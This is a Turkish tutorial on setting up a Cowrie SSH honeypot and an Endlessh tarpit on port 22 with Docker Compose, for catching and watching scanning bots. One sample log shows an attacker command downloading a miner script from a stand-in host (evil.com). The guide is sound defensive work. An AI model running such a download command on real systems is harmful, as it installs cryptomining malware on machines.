# Aktif Savunma: Honeypot & Tarpit 🍯

> [!TIP] > **Eğlence Zamanı!** 🎣
> Bu bölüm zorunlu değildir ama yapması çok zevklidir. Sunucunuzu boş boş tarayan botlardan intikam almak istiyorsanız doğru yerdesiniz.

SSH portunuzu **2222** (veya başka bir porta) taşıdınız. Peki boş kalan **22** portuna ne olacak?

İki seçeneğiniz var:

1.  **Tarpit (Endlessh):** Botları sonsuz döngüde bekletip delirtmek (Düşük Kaynak).
2.  **Honeypot (Cowrie):** Sahte bir sistem sunup ne yaptıklarını izlemek (Yüksek Eğlence).

## Seçenekler & Karşılaştırma

| Honeypot      | Ne yapar                             | Etkileşim   | Eğlence  |
| :------------ | :----------------------------------- | :---------- | :------- |
| **Cowrie**    | Sahte SSH/Telnet, komutları loglar   | Orta-Yüksek | ⭐⭐⭐⭐ |
| **Endlessh**  | SSH bağlantısını yavaşlatır (tarpit) | Düşük       | ⭐⭐     |
| **Kippo**     | Cowrie'nin atası, eski               | Orta        | ⭐⭐     |
| **Honeyport** | Basit port listener                  | Çok düşük   | ⭐       |

### Hangisini Seçmeliyim?

**Endlessh (Tarpit):** Sıkıcı ama etkilidir. Bot bağlanır, sunucu ona çok yavaş veri gönderir. Bot günlerce bekler.
**Cowrie (Fake SSH):** Eğlencelidir. Bot'a sahte bir login (root:123456) verir. Bot içeri girdiğini sanır, `wget malware.sh` yapar. Cowrie hepsini kaydeder.

---

## 1. Cowrie Kurulumu (Önerilen) 🎯

Docker ile izole bir şekilde kuracağız.

### Dizin Yapısı

```bash
mkdir -p ~/honeypot && cd ~/honeypot
```

### Docker Compose Dosyası

`docker-compose.yml` oluşturun:

```yaml
version: "3.8"

services:
  cowrie:
    image: cowrie/cowrie:latest
    container_name: cowrie
    restart: unless-stopped

    # Güvenlik - container hardening
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL

    # Kaynak limiti
    mem_limit: 256m
    cpus: 0.5

    # Port 22 dışarıya açık, container içinde 2222
    ports:
      - "22:2222"

    # Logları sakla
    volumes:
      - cowrie_logs:/cowrie/var/log/cowrie
      - cowrie_downloads:/cowrie/var/lib/cowrie/downloads

    # İzole network
    networks:
      - honeypot_net

networks:
  honeypot_net:
    driver: bridge
    internal: false # Dışarıdan erişim lazım

volumes:
  cowrie_logs:
  cowrie_downloads:
```

### Başlatma ve İzleme

```bash
docker compose up -d

# Eğlenceyi izle:
docker logs -f cowrie
```

**Loglarda Görecekleriniz:**

```text
Login successful: root:123456
Command: uname -a
Command: wget http://evil.com/miner.sh
Downloaded: miner.sh (saved)
```

Cowrie, indirilen dosyaları `cowrie_downloads` volume'üne kaydeder. İnceleyebilirsiniz (tabii sanal makinede!).

---

## 2. Endlessh Kurulumu (Tarpit) ⏳

Endlessh, botları **"sonsuz bir döngüye"** sokarak kaynaklarını (zaman ve işlemci) boşa harcatan basit ama dâhice bir araçtır.

### Mantığı Nedir?

SSH protokolüne göre sunucu, istemciye (bota) bir "banner" (kimlik bilgisi) gönderir. Endlessh, bu banner'ı **tek seferde değil, karakter karakter ve çok yavaş** gönderir.

- Sunucu: `S` ... (10 saniye bekle) ... `S` ... (10 saniye bekle) ... `H` ...
- Bot: "Hala veri geliyor, bekleyeyim" der ve bağlantıyı koparmaz.
- **Sonuç:** Botun thread'i kilitlenir ve günlerce o portta takılı kalır. Başka sunuculara saldıramaz.

### Docker Compose ile Kurulum

`docker run` yerine yönetimi kolay olan Compose kullanalım.

1.  Klasör oluşturun: `mkdir -p ~/endlessh && cd ~/endlessh`
2.  `docker-compose.yml` dosyası oluşturun:

```yaml
version: "3.8"

services:
  endlessh:
    image: stored/endlessh:latest
    container_name: endlessh
    restart: unless-stopped
    ports:
      # Host Port 22 -> Container Port 2222
      # (Gerçek SSH'ınızı 2222 gibi başka bir porta aldığınızdan emin olun!)
      - "22:2222"
    environment:
      # Her karakter arası bekleme süresi (milisaniye)
      - MS_DELAY=10000
      # Aynı anda tuzağa düşürülebilecek maksimum bot sayısı
      - MAX_CLIENTS=4096
      # Log seviyesi (0=Sessiz, 1=Standart, 2=Debug)
      - LOG_LEVEL=1
      # Banner satır uzunluğu
      - MAX_LINE_LENGTH=32
    # Güvenlik: Read-only dosya sistemi
    read_only: true
    cap_drop:
      - ALL
```

### Başlatma

```bash
docker compose up -d
```

### İzleme ve İstatistikler 📊

Botların nasıl tuzağa düştüğünü izlemek keyiflidir.

**Canlı Loglar:**

```bash
docker logs -f endlessh
```

**Çıktı Örneği:**

```text
OPEN: host=103.21.55.2 port=54321 fd=4 n=1/4096
... (10 dakika sonra) ...
CLOSE: host=103.21.55.2 port=54321 fd=4 n=0/4096 time=600.000
```

- `OPEN`: Bot tuzağa düştü.
- `time=600.000`: Bot tam **600 saniye (10 dakika)** boyunca boşuna beklemiş!

**İstatistik Çıkarma:**
Kaç farklı IP adresini tuzağa düşürdük?

```bash
docker logs endlessh 2>&1 | grep "OPEN" | awk '{print $2}' | cut -d= -f2 | sort | uniq -c | sort -nr | head -10
```

### Neden Endlessh?

- **Sıfır Kaynak:** Neredeyse 0 CPU ve RAM harcar (Go veya C ile yazılmıştır).
- **İntikam:** Sizi tarayan botların zamanını çalarak interneti (birazcık) temizlemiş olursunuz.

> [!WARNING] > **Firewall Ayarı:**
> Honeypot kurduktan sonra UFW veya Cloud Security List'te **Port 22**'yi açmalısınız ki botlar tuzağa düşsün! (Kendi gerçek SSH'ınızın başka portta olduğundan emin olun).

```

```
